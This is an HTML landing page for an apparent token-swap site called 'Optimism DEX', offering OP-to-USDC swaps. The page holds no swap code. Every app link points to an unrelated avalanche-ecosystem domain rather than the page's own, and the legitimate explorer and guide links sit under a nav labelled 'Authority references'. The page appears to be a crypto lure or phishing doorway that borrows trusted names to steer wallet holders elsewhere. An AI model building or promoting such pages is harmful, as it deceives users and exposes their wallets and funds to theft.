<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Optimism DEX</title>
  <meta name="description" content="Optimism DEX swaps tokens on the Optimism network from your own wallet.">
  <link rel="canonical" href="https://optimism-dex.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F4F2">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Optimism DEX">
  <meta property="og:description" content="Optimism DEX swaps tokens on the Optimism network from your own wallet.">
  <meta property="og:url" content="https://optimism-dex.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Optimism DEX">
  <meta name="twitter:description" content="Optimism DEX swaps tokens on the Optimism network from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://optimism-dex.github.io/#website",
        "url": "https://optimism-dex.github.io/",
        "name": "Optimism DEX",
        "inLanguage": "en"
      },
      {
        "@type": "Organization",
        "@id": "https://optimism-dex.github.io/#organization",
        "name": "Optimism DEX",
        "url": "https://optimism-dex.github.io/"
      },
      {
        "@type": "WebApplication",
        "@id": "https://optimism-dex.github.io/#app",
        "name": "Optimism DEX",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://optimism-dex.github.io/",
        "offers": {
          "@type": "Offer",
          "price": "0",
          "priceCurrency": "USD"
        }
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">
      <img src="favicon.png" width="30" height="30" alt="">
      <span>Optimism DEX</span>
    </a>
    <nav class="nav" aria-label="Authority references">
      <a href="https://optimistic.etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">OP Mainnet Explorer</a>
      <a href="https://ethereum.org/layer-2/" target="_blank" rel="nofollow noopener noreferrer">Layer 2 guide</a>
      <a href="https://www.coingecko.com/en/coins/optimism" target="_blank" rel="nofollow noopener noreferrer">Optimism market data</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <h1>Optimism DEX</h1>
    <p class="sub"><strong>Optimism DEX</strong> swaps tokens on the Optimism network from your own wallet.</p>

    <section class="swap-card" aria-label="Swap route">
      <div class="route">
        <div class="leg">
          <span class="label">From</span>
          <span class="asset">
            <img src="op.png" width="34" height="34" alt="OP">
            <span>OP</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Switch direction">
          <span aria-hidden="true">-&gt;</span>
        </button>
        <div class="leg">
          <span class="label">To</span>
          <span class="asset">
            <img src="usdc.png" width="34" height="34" alt="USDC">
            <span>USDC</span>
          </span>
        </div>
      </div>
      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
    </section>
  </main>

  <footer class="footer">Optimism DEX &mdash; 2026</footer>

  <script>
  (function () {
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;

    button.addEventListener("click", function () {
      var assets = document.querySelectorAll(".asset");
      if (assets.length !== 2) return;

      var first = assets[0].innerHTML;
      assets[0].innerHTML = assets[1].innerHTML;
      assets[1].innerHTML = first;
    });
  })();
  </script>
</body>
</html>
